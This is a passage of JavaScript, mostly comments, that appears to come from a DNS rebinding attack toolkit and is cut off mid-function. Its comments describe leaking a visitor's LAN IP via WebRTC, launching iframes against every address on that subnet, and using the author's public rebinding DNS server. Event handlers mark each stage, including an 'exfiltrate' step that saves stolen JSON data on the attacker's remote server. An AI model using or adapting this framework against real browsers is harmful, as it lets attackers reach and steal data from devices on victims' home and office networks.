    // DNSRebindAttack has a static method that uses WebRTC to leak the
    // browser's IP address on the LAN. We'll use this to guess the LAN's IP
    // subnet. If the local IP is 192.168.1.89, we'll launch 255 iframes
    // targetting all IP addresses from 192.168.1.1-255

        // whonow server (https://github.com/brannondorsey/whonow).
        // I've got one running on port 53 of rebind.network you can to use.

        // Args are:
        //  1) target ip addresses
        //  2) IP address your Node server.js is running on. Usually 127.0.0.1
        //     during dev, but then the publicly accessible IP (not hostname)
        //     of the VPS hosting this repo in production.
        //  3) the HTML payload to deliver to this service. This HTML file should
        //     have a DNSRebindNode instance implemented on in it.
        //  4) the interval in milliseconds to wait between each new iframe
        //     embed. Spawning 100 iframes at the same time can choke (or crash)
        //     a browser. The higher this value, the longer the attack takes,
        //     but the less resources it consumes.

        //  - iframe-removed: called each time an iframe is removed from the page
        //    using a DNSRebindNode.emit('end') event.
        //  - all-iframes-added: called once all iframes have been added. This
        //    doesn't mean all iframe's attacks have finished, only that they
        //    have all started.

        // fires each time a new iframe is added to the DOM

        // rebind.nodes is also an EventEmitter, only this one is fired using
        // DNSRebindNode.emit(...). This allows DNSRebindNodes inside of
        // iframes to post messages back to the parent DNSRebindAttack that
        // launched them. You can define custome events by simply emitting
        // DNSRebindNode.emit('my-custom-event') and a listener in rebind.nodes
        // can receive it. That said, there are a few standard event names that
        // get triggered automagically:
        //  - begin: triggered when DNSRebindNode.js is loaded. This signifies
        //    that an attack has been launched (or at least, it's payload was
        //    delivered) against an IP address.
        //  - rebind: the DNS rebind was successful, this node should now be
        //    communicating with the target service.
        //  - exfiltrate: send JSON data back to your Node server.js and save
        //    it inside the data/ folder.
        // Additionally, the DNSRebindNode.destroy() static method
        // will trigger the 'destory' event and cause DNSRebindAttack to
        // remove the iframe.

        rebind.nodes.on('begin', (ip) => {
            // the DNSRebindNode has been loaded, attacking ip
        })

        rebind.nodes.on('rebind', (ip) => {
            // the rebind was successful
            console.log('node rebind', ip)
        })

        rebind.nodes.on('exfiltrate', (ip, data) => {
            // JSON data was exfiltrated and saved to the data/
            // folder on the remote machine hosting server.js
            console.log('node exfiltrate', ip, data)
        })

        rebind.nodes.on('destroy', (ip) => {
            // this event is triggered by DNSRebindNode.destroy().
            // Immediately after this event is fired, the DNSRebindAttack
            // instance removes this ip's iframe from the page and the
            // attack against that host is finished.
        })

        // you can add your own custom events too! Simply fire them using
        // DNSRebindNode.emit('my-custom-event') and subscribe to them like so.
        rebind.nodes.on('my-custom-event', (ip, data) => {
